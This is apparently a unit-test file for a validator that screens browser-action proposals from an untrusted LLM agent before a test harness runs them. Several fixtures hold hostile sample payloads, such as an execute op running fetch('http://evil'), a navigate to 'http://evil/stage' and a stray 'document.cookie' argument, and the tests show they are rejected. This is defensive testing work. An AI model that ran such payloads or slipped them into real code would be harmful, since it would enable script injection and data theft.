// @ts-check
/**
 * Proposer unit tests — API-FREE (a fake llmFn; no ANTHROPIC_API_KEY, no network). These prove the
 * PURE gate that makes an untrusted agent proposal safe:
 *   - validateProposal ACCEPTS a good proposal (and whitelists its args — no stray keys carried on)
 *   - REJECTS an execute op, a navigate op (FW-P1-D: no JS/staging escape)
 *   - REJECTS a wrong-shape arg (type without text; clickAt with a non-numeric coord)
 *   - REJECTS an out-of-menu entity (FW-P1-C) and a bad relation op
 *   - the MINT-BOUNDARY: proposer.mjs imports NEITHER mint NOR sealBundle (a proposal is pure data)
 *   - the quantifier lint (quantifierFromIntent) is ADD-only through assembleCatchBundle
 *   - the seam wiring: extractProposal reads a tool_use block (throws when there is none),
 *     buildProposeTool encodes the exact enums, proposeWalkAndClaim runs a fake llmFn end-to-end.
 *   - the claude-CLI seam (claudeCliLlmFn): AUTH-FREE via a fake exec — the exact cold headless argv
 *     (-p, --output-format json, --model sonnet, tools off, a NEUTRAL tmp cwd), a good/fenced .result
 *     → a valid proposal through validateProposal, and the throw paths (is_error OAuth envelope,
 *     non-JSON .result, and a hostile .result rejected by validateProposal → CND).
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import {
  validateProposal,
  proposeWalkAndClaim,
  extractProposal,
  buildProposeTool,
  buildCliPrompt,
  claudeCliLlmFn,
  ALLOWED_WALK_OPS,
  ALLOWED_RELATION_OPS,
} from '../src/proposer.mjs';
import { assembleCatchBundle, quantifierFromIntent } from '../src/catch.mjs';

const OBSERVABLES = ['execution_entity.max_id'];

/** A realistic GOOD raw proposal for the n8n Form Trigger front door. @returns {any} */
function goodRaw() {
  return {
    walk: [
      { op: 'type', args: { selector: 'input[name="field-0"]', text: 'pb-response' } },
      { op: 'click', args: { selector: 'button[type="submit"]' } },
    ],
    claim: { entity: 'execution_entity.max_id', expectedAfterRelation: { op: 'increased' }, scope: 'a visitor submits the form' },
  };
}

test('validateProposal: accepts a good proposal and whitelists step args (no stray keys carried on)', () => {
  const raw = goodRaw();
  raw.walk[0].args.evil = 'document.cookie'; // a stray arg key the executor must never see
  const { walk, claim } = validateProposal(raw, { observables: OBSERVABLES });
  assert.equal(walk.length, 2);
  assert.deepEqual(walk[0], { op: 'type', args: { selector: 'input[name="field-0"]', text: 'pb-response' } }); // stray key stripped
  assert.deepEqual(walk[1], { op: 'click', args: { selector: 'button[type="submit"]' } });
  assert.equal(claim.entity, 'execution_entity.max_id');
  assert.deepEqual(claim.expectedAfterRelation, { op: 'increased' });
  assert.equal(claim.scope, 'a visitor submits the form');
  assert.equal(claim.quantified, undefined);
});

test('validateProposal: REJECTS an execute op (FW-P1-D — no arbitrary JS escape)', () => {
  const raw = goodRaw();
  raw.walk = [{ op: 'execute', args: { script: "fetch('http://evil').then(r=>r.text())" } }];
  assert.throws(() => validateProposal(raw, { observables: OBSERVABLES }), /walk\[0\]\.op must be one of|execute\/navigate are excluded|FW-P1-D/);
});

test('validateProposal: REJECTS a navigate op (FW-P1-D — no re-staging escape)', () => {
  const raw = goodRaw();
  raw.walk = [{ op: 'navigate', args: { url: 'http://evil/stage' } }];
  assert.throws(() => validateProposal(raw, { observables: OBSERVABLES }), /execute\/navigate are excluded|FW-P1-D/);
});

test('validateProposal: REJECTS a wrong-shape arg (type without text; clickAt with a non-numeric coord)', () => {
  const noText = { walk: [{ op: 'type', args: { selector: 'input[name="field-0"]' } }], claim: goodRaw().claim };
  assert.throws(() => validateProposal(noText, { observables: OBSERVABLES }), /walk\[0\]\.args\.text must be a non-empty string/);
  const badCoord = { walk: [{ op: 'clickAt', args: { x: '10', y: 20 } }], claim: goodRaw().claim };
  assert.throws(() => validateProposal(badCoord, { observables: OBSERVABLES }), /walk\[0\]\.args\.x must be a finite number/);
});

test('validateProposal: clickAt accepts an optional boolean shift (a multi-select gesture) and rejects a non-boolean one', () => {
  const withShift = { walk: [{ op: 'clickAt', args: { x: 10, y: 20, shift: true } }], claim: goodRaw().claim };
  const { walk } = validateProposal(withShift, { observables: OBSERVABLES });
  assert.deepEqual(walk[0], { op: 'clickAt', args: { x: 10, y: 20, shift: true } });
  const noShift = { walk: [{ op: 'clickAt', args: { x: 10, y: 20 } }], claim: goodRaw().claim };
  assert.deepEqual(validateProposal(noShift, { observables: OBSERVABLES }).walk[0], { op: 'clickAt', args: { x: 10, y: 20 } });
  const badShift = { walk: [{ op: 'clickAt', args: { x: 10, y: 20, shift: 'yes' } }], claim: goodRaw().claim };
  assert.throws(() => validateProposal(badShift, { observables: OBSERVABLES }), /walk\[0\]\.args\.shift must be a boolean/);
});

test('validateProposal: REJECTS an out-of-menu entity (FW-P1-C) and a bad relation op', () => {
  const outOfMenu = { walk: goodRaw().walk, claim: { entity: 'order.total', expectedAfterRelation: { op: 'increased' }, scope: 's' } };
  assert.throws(() => validateProposal(outOfMenu, { observables: OBSERVABLES }), /entity must be one of the harness-enumerated observables|FW-P1-C/);
  const badRel = { walk: goodRaw().walk, claim: { entity: 'execution_entity.max_id', expectedAfterRelation: { op: 'exploded' }, scope: 's' } };
  assert.throws(() => validateProposal(badRel, { observables: OBSERVABLES }), /expectedAfterRelation\.op must be one of/);
});

test('validateProposal: an empty walk is rejected (a proposal must propose at least one gesture)', () => {
  assert.throws(() => validateProposal({ walk: [], claim: goodRaw().claim }, { observables: OBSERVABLES }), /walk must be a non-empty array/);
});

test('validateProposal: an "http" op is rejected under the default (browser) allowedOps — walk vocabularies stay scoped per drive', () => {
  const raw = { walk: [{ op: 'http', args: { method: 'GET', path: '/x' } }], claim: goodRaw().claim };
  assert.throws(() => validateProposal(raw, { observables: OBSERVABLES }), /walk\[0\]\.op must be one of/);
});

test('MINT-BOUNDARY: proposer.mjs imports NEITHER mint NOR sealBundle — a proposal is pure data', () => {
  const src = readFileSync(fileURLToPath(new URL('../src/proposer.mjs', import.meta.url)), 'utf8');
  const importLines = src.split('\n').filter((l) => /^\s*import\b/.test(l));
  for (const l of importLines) {
    assert.doesNotMatch(l, /harness\.mjs/, 'proposer must not import from harness.mjs (that exports mint)');
    assert.doesNotMatch(l, /evidence\.mjs/, 'proposer must not import from evidence.mjs (that exports sealBundle)');
    assert.doesNotMatch(l, /\bmint\b/, 'proposer must not import mint');
    assert.doesNotMatch(l, /\bsealBundle\b/, 'proposer must not import sealBundle');
  }
  assert.doesNotMatch(src, /\bsealBundle\b/, 'proposer references sealBundle nowhere — it cannot seal');
});

test('quantifier lint: quantifierFromIntent is word-bounded (no false positive on across/worlds/allocate)', () => {
  assert.equal(quantifierFromIntent('Any visitor can submit the form'), true);
  assert.equal(quantifierFromIntent('Every user gets a booking'), true);
  assert.equal(quantifierFromIntent('all tenants are isolated'), true);
  assert.equal(quantifierFromIntent('A visitor submits the form'), false);
  assert.equal(quantifierFromIntent('reproduced across fresh worlds; allocate a slot'), false); // across/worlds/allocate ≠ all/every
  assert.equal(quantifierFromIntent(undefined), false);
});

test('quantifier lint is ADD-only: a quantified intent turns the claim quantified even when the agent proposed false', () => {
  const claim = { entity: 'execution_entity.max_id', expectedAfterRelation: { op: 'increased' }, scope: 's', quantified: false };
  // Intent carries "any" → the harness ADDS quantified even though the agent set it false (FW-P1-E).
  const q = assembleCatchBundle({ intent: 'Any visitor can submit the form', claim, iterations: [] });
  assert.equal(q.claims[0]?.quantified, true, 'the lint could not be cleared by the agent');
  // No universal quantifier + agent did not ask → not quantified.
  const nq = assembleCatchBundle({ intent: 'A visitor submits the form', claim: { ...claim, quantified: false }, iterations: [] });
  assert.equal(nq.claims[0]?.quantified, undefined);
  // The agent may still ADD it on a non-quantified intent (its own choice).
  const agentAdds = assembleCatchBundle({ intent: 'A visitor submits the form', claim: { ...claim, quantified: true }, iterations: [] });
  assert.equal(agentAdds.claims[0]?.quantified, true);
});

test('extractProposal: reads the tool_use block input; throws when there is no tool_use', () => {
  const body = { content: [{ type: 'text', text: 'here is my plan' }, { type: 'tool_use', name: 'propose_walk', input: goodRaw() }] };
  assert.deepEqual(extractProposal(body), goodRaw());
  assert.throws(() => extractProposal({ content: [{ type: 'text', text: 'no tool call' }] }), /no tool_use block/);
  assert.throws(() => extractProposal({}), /no tool_use block/);
});

test('buildProposeTool: input_schema encodes the op enum, the entity enum (=observables), and the relation enum', () => {
  const tool = buildProposeTool(OBSERVABLES);
  assert.equal(tool.name, 'propose_walk');
  const props = tool.input_schema.properties;
  assert.deepEqual(props.walk.items.properties.op.enum, [...ALLOWED_WALK_OPS]);
  assert.ok(!props.walk.items.properties.op.enum.includes('execute') && !props.walk.items.properties.op.enum.includes('navigate'));
  assert.deepEqual(props.claim.properties.entity.enum, OBSERVABLES);
  assert.deepEqual(props.claim.properties.expectedAfterRelation.properties.op.enum, [...ALLOWED_RELATION_OPS]);
});

test('proposeWalkAndClaim: a fake llmFn flows through validation to a clean {walk, claim}', async () => {
  const proposal = await proposeWalkAndClaim(
    { intent: 'A visitor submits the form', introspection: { fields: [{ name: 'field-0', type: 'text', tag: 'input' }] }, observables: OBSERVABLES },
    { llmFn: async () => goodRaw() }
  );
  assert.equal(proposal.walk.length, 2);
  assert.equal(proposal.claim.entity, 'execution_entity.max_id');
  // A hostile llmFn (execute-op walk) makes proposeWalkAndClaim reject (→ caller CNDs).
  await assert.rejects(
    proposeWalkAndClaim(
      { intent: 'x', introspection: { fields: [] }, observables: OBSERVABLES },
      { llmFn: async () => ({ walk: [{ op: 'execute', args: { script: 'x' } }], claim: goodRaw().claim }) }
    ),
    /execute\/navigate are excluded|FW-P1-D/
  );
});

// --- the claude-CLI seam (claudeCliLlmFn) — AUTH-FREE via a fake exec ---------------------------

/** Wrap model text in the `claude -p --output-format json` SUCCESS envelope. @param {string} r */
function okEnvelope(r) {
  return { type: 'result', subtype: 'success', is_error: false, result: r };
}

/**
 * A fake claude runner: records (args, cwd) per call, returns the queued spawnSync-shaped result.
 * Mirrors storetap/browserdrive's fakeDocker — the whole seam runs without the CLI or any auth.
 * @param {{status?:number|null, stdout?:string, stderr?:string, error?:Error}} result
 */
function fakeRunner(result) {
  /** @type {Array<{args:string[], cwd:string}>} */
  const calls = [];
  return {
    calls,
    run: (/** @type {string[]} */ args, /** @type {string} */ cwd) => {
      calls.push({ args, cwd });
      return /** @type {any} */ (result);
    },
  };
}

test('claudeCliLlmFn: builds the cold headless argv (-p, --output-format json, --model sonnet, tools off, NEUTRAL cwd)', async () => {
  const runner = fakeRunner({ status: 0, stdout: JSON.stringify(okEnvelope(JSON.stringify(goodRaw()))) });
  const raw = await claudeCliLlmFn({ intent: 'A visitor submits the form', introspection: { fields: [] }, observables: OBSERVABLES }, { runner });
  assert.deepEqual(raw, goodRaw());
  const { args, cwd } = runner.calls[0];
  assert.equal(args[0], '-p');
  assert.match(args[1], /ONLY a single JSON object/); // the prompt carries the JSON-only instruction…
  assert.match(args[1], /execution_entity\.max_id/); // …the observable menu…
  assert.match(args[1], /find\|type\|click\|clickAt\|pointer/); // …and the op enum
  assert.deepEqual(args.slice(2), [
    '--output-format', 'json', '--model', 'sonnet',
    '--disallowedTools', 'Bash Read Edit Write Glob Grep WebFetch WebSearch Task',
  ]);
  // COLD cwd: a FRESH neutral tmp dir, not the pb repo (the nested agent cannot see the recipe/answer).
  assert.ok(cwd.startsWith(tmpdir()), `expected a tmp cwd, got ${cwd}`);
  assert.ok(cwd.includes('pb-proposer-'), `expected a fresh pb-proposer- dir, got ${cwd}`);
  assert.notEqual(cwd, process.cwd());
  rmSync(cwd, { recursive: true, force: true });
});

test('claudeCliLlmFn → proposeWalkAndClaim: a good JSON .result flows through validateProposal to a clean {walk, claim}', async () => {
  const runner = fakeRunner({ status: 0, stdout: JSON.stringify(okEnvelope(JSON.stringify(goodRaw()))) });
  const proposal = await proposeWalkAndClaim(
    { intent: 'A visitor submits the form', introspection: { fields: [] }, observables: OBSERVABLES },
    { llmFn: (input) => claudeCliLlmFn(input, { runner, cwd: tmpdir() }) }
  );
  assert.equal(proposal.walk.length, 2);
  assert.equal(proposal.claim.entity, 'execution_entity.max_id');
});

test('claudeCliLlmFn: a ```json-fenced .result is stripped and parsed', async () => {
  const fenced = '```json\n' + JSON.stringify(goodRaw()) + '\n```';
  const runner = fakeRunner({ status: 0, stdout: JSON.stringify(okEnvelope(fenced)) });
  const raw = await claudeCliLlmFn({ intent: 'x', introspection: {}, observables: OBSERVABLES }, { runner, cwd: tmpdir() });
  assert.deepEqual(raw, goodRaw());
});

test('claudeCliLlmFn: is_error:true (the OAuth-expired envelope) throws → an honest could-not-execute (CND)', async () => {
  const oauth = { type: 'result', subtype: 'error', is_error: true, result: 'Failed to authenticate: OAuth session expired and could not be refreshed' };
  const runner = fakeRunner({ status: 0, stdout: JSON.stringify(oauth) });
  await assert.rejects(
    () => claudeCliLlmFn({ intent: 'x', introspection: {}, observables: OBSERVABLES }, { runner, cwd: tmpdir() }),
    /could not execute the proposal|OAuth session expired/
  );
});

test('claudeCliLlmFn: a non-zero exit with no JSON envelope throws (names the CLI error → CND)', async () => {
  const runner = fakeRunner({ status: 1, stdout: '', stderr: 'claude: command failed' });
  await assert.rejects(
    () => claudeCliLlmFn({ intent: 'x', introspection: {}, observables: OBSERVABLES }, { runner, cwd: tmpdir() }),
    /did not return a JSON envelope|command failed/
  );
});

test('claudeCliLlmFn: a non-JSON .result throws (a proposal must be a JSON {walk, claim} object)', async () => {
  const runner = fakeRunner({ status: 0, stdout: JSON.stringify(okEnvelope('here is my plan, no JSON for you')) });
  await assert.rejects(
    () => claudeCliLlmFn({ intent: 'x', introspection: {}, observables: OBSERVABLES }, { runner, cwd: tmpdir() }),
    /did not return a JSON \{walk, claim\}/
  );
});

test('claudeCliLlmFn → proposeWalkAndClaim: a hostile .result (execute op) is rejected by validateProposal (FW-P1-D → CND)', async () => {
  const hostile = { walk: [{ op: 'execute', args: { script: "fetch('http://evil')" } }], claim: goodRaw().claim };
  const runner = fakeRunner({ status: 0, stdout: JSON.stringify(okEnvelope(JSON.stringify(hostile))) });
  await assert.rejects(
    proposeWalkAndClaim(
      { intent: 'x', introspection: {}, observables: OBSERVABLES },
      { llmFn: (input) => claudeCliLlmFn(input, { runner, cwd: tmpdir() }) }
    ),
    /execute\/navigate are excluded|FW-P1-D/
  );
});

test('claudeCliLlmFn → proposeWalkAndClaim: an out-of-menu entity .result is rejected by validateProposal (FW-P1-C → CND)', async () => {
  const hostile = { walk: goodRaw().walk, claim: { entity: 'order.total', expectedAfterRelation: { op: 'increased' }, scope: 's' } };
  const runner = fakeRunner({ status: 0, stdout: JSON.stringify(okEnvelope(JSON.stringify(hostile))) });
  await assert.rejects(
    proposeWalkAndClaim(
      { intent: 'x', introspection: {}, observables: OBSERVABLES },
      { llmFn: (input) => claudeCliLlmFn(input, { runner, cwd: tmpdir() }) }
    ),
    /entity must be one of the harness-enumerated observables|FW-P1-C/
  );
});

test('buildCliPrompt: encodes the op enum, the entity menu (=observables), the relation enum, and a JSON-ONLY instruction', () => {
  const p = buildCliPrompt({ intent: 'A visitor submits the form', introspection: { fields: [] }, observables: OBSERVABLES });
  assert.match(p, /find\|type\|click\|clickAt\|pointer/);
  assert.match(p, /increased\|decreased\|changed\|unchanged\|equals/);
  assert.match(p, /execution_entity\.max_id/);
  assert.match(p, /ONLY a single JSON object/);
  // No forced tool in `claude -p`: the prompt explicitly neutralizes the tool clause and mandates raw JSON.
  assert.match(p, /ignore any instruction above to reply via a tool/);
  // linkding #1170 surfaced a real gap: the prompt never told the model 'equals' needs a value,
  // so it proposed {op:'equals'} with none — an unsatisfiable claim (deepEqual(x, undefined) is
  // always false). The prompt must say so explicitly.
  assert.match(p, /REQUIRED when op is 'equals'/);
});

test("buildProposeTool: expectedAfterRelation.value's description flags it REQUIRED for 'equals' (the same gap, API tool-call path)", () => {
  const tool = buildProposeTool(OBSERVABLES);
  const props = tool.input_schema.properties;
  assert.match(props.claim.properties.expectedAfterRelation.properties.value.description, /REQUIRED when op is 'equals'/);
});

test('buildCliPrompt: the browser DEFAULT is byte-identical with and without an explicit allowedOps (no regression)', () => {
  const input = { intent: 'A visitor submits the form', introspection: { fields: [] }, observables: OBSERVABLES };
  assert.equal(buildCliPrompt(input), buildCliPrompt({ ...input, allowedOps: ALLOWED_WALK_OPS }));
  assert.match(buildCliPrompt(input), /Use ONLY find\/type\/click/); // the browser walk text is still there
});

test('proposeWalkAndClaim: threads allowedOps into the llmFn input (the browser default)', async () => {
  /** @type {any} */ let seen;
  await proposeWalkAndClaim({ intent: 'x', introspection: {}, observables: OBSERVABLES }, { llmFn: async (input) => ((seen = input), goodRaw()) });
  assert.deepEqual(seen.allowedOps, [...ALLOWED_WALK_OPS]); // the default vocabulary reaches the seam too
});
